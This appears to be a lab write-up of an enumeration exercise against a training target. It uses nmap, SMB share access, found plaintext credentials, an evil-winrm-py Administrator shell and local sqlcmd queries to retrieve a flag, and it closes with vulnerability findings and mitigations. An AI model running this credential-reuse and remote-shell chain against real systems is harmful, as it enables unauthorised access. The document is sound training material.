# Footprinting Lab – SMB/WinRM/MSSQL Enumeration

**Target:** `10.129.202.41` **Date:** June 09, 2026 **Tester:** Valentina

---

## 1. Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed to identify all running services:

```bash
nmap -p- -sV 10.129.202.41
```

**Key findings:**

|Port|Service|Detail|
|---|---|---|
|139/tcp|NetBIOS|Windows netbios-ssn|
|445/tcp|SMB|microsoft-ds|
|3389/tcp|RDP|Microsoft Terminal Services|
|5985/tcp|WinRM|Microsoft HTTPAPI 2.0|

Notable: port 1433 (MSSQL) was **not exposed externally**, meaning SQL Server was only accessible locally.

---

### 1.2 SMB Enumeration

SMB enumeration was performed using `enum4linux-ng` and `smbclient`. The following shares were discovered:

|Share|Access|
|---|---|
|ADMIN$|Denied|
|C$|Denied|
|IPC$|Listing not supported|
|Users|Accessible|
|devshare|Accessible|

The `devshare` share was accessed using credentials `alex:lol123!mD`:

```bash
smbclient //10.129.202.41/devshare -U alex
```

Inside, a file `important.txt` contained SQL Server credentials:

```
sa:87N1ns@slls83
```

---

### 1.3 SMB – Users Share

The `Users` share was accessed using the Administrator account with the discovered password:

```bash
smbclient //10.129.202.41/Users -U Administrator
```

Browsing `Administrator\Documents` revealed SQL Server Management Studio and Visual Studio installations, confirming a local MSSQL instance.

## 2. WinRM Access

With port 5985 open, a WinRM session was established using Administrator credentials:

```bash
evil-winrm-py -i 10.129.202.41 -u Administrator -p '87N1ns@slls83'
```

A shell was obtained as `Administrator`.

---

## 3. Local MSSQL Enumeration

From the Administrator shell, MSSQL was queried locally using Windows authentication:

```bash
sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases"
```

Databases found: `master`, `tempdb`, `model`, `msdb`, `accounts`.

The `accounts` database contained a table `devsacc`:

```bash
sqlcmd -S localhost -E -Q "SELECT table_name FROM accounts.information_schema.tables"
sqlcmd -S localhost -E -Q "SELECT * FROM accounts.dbo.devsacc WHERE name='HTB'"
```

The flag was stored as the password for the `HTB` user:

```
HTB:lnch7ehrdn43i7AoqVPK4zWR
```

## 4. Vulnerability Summary

|Vulnerability|Description|
|---|---|
|Credentials in SMB share|`important.txt` in `devshare` exposed SQL Server credentials in plaintext|
|Weak credential reuse|The `sa` SQL password doubled as the Administrator Windows password|
|WinRM exposed|Port 5985 allowed remote shell access with valid credentials|
|MSSQL sensitive data|Database contained plaintext credentials for 200 accounts including the flag|

---

## 5. Mitigations

- **Credential storage:** Never store credentials in plaintext files on network shares. Use a secrets manager.
- **Credential reuse:** SQL service accounts should never share passwords with Windows administrator accounts.
- **WinRM access:** Restrict WinRM access to specific management IPs using firewall rules.
- **MSSQL data:** Sensitive data should be encrypted at rest. Passwords should be hashed, never stored in plaintext.
- **Share permissions:** Apply least-privilege to SMB shares; `devshare` should not be readable by regular users.

---

## 6. Lessons Learned

- When a service port is closed externally, gaining a shell first and connecting locally is the correct approach.
- SMB shares are often overlooked but frequently contain sensitive files left by developers or administrators.
- Windows authentication (`-E` flag in sqlcmd) bypasses SQL login failures when you already have a valid Windows session.
- Credential reuse across services significantly reduces the attacker's effort — one finding cascades into full access.
